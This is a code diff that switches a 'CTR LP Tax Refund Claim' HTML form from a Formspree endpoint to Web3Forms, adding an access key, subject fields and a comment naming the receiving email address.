@@ -375,24 +375,16 @@
       </div>
       <div class="form-body">
 
-        <!--
-          ╔══════════════════════════════════════════════════════════════╗
-          ║  FORMSPREE SETUP:                                          ║
-          ║  1. Go to https://formspree.io and create a free account   ║
-          ║  2. Create a new form — you'll get an ID like "xpzvqkdl"   ║
-          ║  3. Replace YOUR_FORM_ID below with your actual form ID    ║
-          ║                                                            ║
-          ║  Example: https://formspree.io/f/xpzvqkdl                  ║
-          ╚══════════════════════════════════════════════════════════════╝
-        -->
+        <!-- Web3Forms integration — submissions go to c6044103@gmail.com -->
         <form
           id="refundForm"
-          action="https://formspree.io/f/mreyobrw"
+          action="https://api.web3forms.com/submit"
           method="POST"
         >
-          <!-- Hidden field for form identification -->
-          <input type="hidden" name="_subject" value="New CTR LP Tax Refund Claim" />
-          <input type="hidden" name="_template" value="table" />
+          <!-- Web3Forms Access Key -->
+          <input type="hidden" name="access_key" value="ece04bae-420f-43f7-ae9d-5365b7363279" />
+          <input type="hidden" name="subject" value="New CTR LP Tax Refund Claim" />
+          <input type="hidden" name="from_name" value="CTR Refund Portal" />
 
           <!-- Section: Personal Info -->
           <div class="section-label"><span>👤</span> Your Information</div>
